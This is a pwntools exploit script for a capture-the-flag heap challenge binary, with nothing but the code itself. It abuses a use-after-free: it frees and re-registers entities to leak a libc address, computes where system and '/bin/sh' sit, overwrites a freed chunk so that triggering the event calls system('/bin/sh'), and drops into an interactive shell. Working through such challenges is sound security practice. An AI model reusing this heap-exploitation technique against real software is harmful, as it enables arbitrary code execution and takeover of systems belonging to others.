# %%

from pwn import *

# %%


def _menu():
    res = conn.recvuntil(b'choice: ')
    return res


def register_entity(idx, name_len, name: bytes):
    print("\nRegister Entity")
    print(f"{idx = }")
    print(f"{name_len = }")
    print(f"{name = }")

    _menu()
    conn.sendline(b'1')

    conn.recvuntil(b'Index: ')
    conn.send(str(idx).encode())

    # TYPO FROM THE AUTHOR
    conn.recvuntil(b'Nmae Length: ')
    conn.sendline(str(name_len).encode())

    conn.recvuntil(b'Name: ')
    conn.send(name)
    return


def delete_entity(idx):
    print("\nDelete Entity")
    print(f"{idx = }")

    _menu()
    conn.sendline(b'2')

    conn.recvuntil(b'Index: ')
    conn.send(str(idx).encode())
    return


def trigger_event(idx, do_recv: bool = True):
    print("\nTrigger Event")
    print(f"{idx = }")

    _menu()
    conn.sendline(b'3')

    conn.recvuntil(b'Index: ')
    conn.send(str(idx).encode())

    a = ""
    if do_recv:
        conn.recvuntil(b'Name: ')
        a = conn.recvline()
        print(a)
        # a = conn.recvline()
        # print(a)
    return a


# %%

context.arch = 'amd64'
context.os == "linux"
context.terminal = ["tmux", "splitw", "-h"]

# conn = remote('10.113.184.121', port)
conn = process('./src/release/share/chal')

# ./src/release/share/chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1be59a1ccee21f046abe47235de19feebe806c9d, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

gdbscript = 'gef\ngef\n'
gdbscript += 'set follow-fork-mode child\n'

_pid = gdb.attach(
    conn,
    gdbscript=gdbscript,
)

# %%

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

register_entity(0, 0x418, b'a')
register_entity(1, 0x418, b'a')

delete_entity(0)
delete_entity(1)

register_entity(0, 0x418, b'a')

a = trigger_event(0)

print("A")

# 0x7fc477019c61 - 0x00007fc476e00000 = 0x219c61
libc_offset = 0x219c61

libc_base = u64(a[:6].ljust(8, b'\x00'))
print(f"{hex(libc_base) = }")
libc_base = libc_base - libc_offset

system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + list(libc.search(b'/bin/sh'))[0]

print(f"{hex(libc_base) = }")
print(f"{hex(system_addr) = }")
print(f"{hex(binsh_addr) = }")
print()

print("B")

register_entity(0, 0x48, b'd')
register_entity(1, 0x48, b'd')
delete_entity(0)
delete_entity(1)

print("C")

payload = flat([
    0,
    binsh_addr,
    system_addr,
])

register_entity(1, 0x18, payload)

print("D")

_menu()

trigger_event(0, False)

print("E")

conn.interactive()

# %%
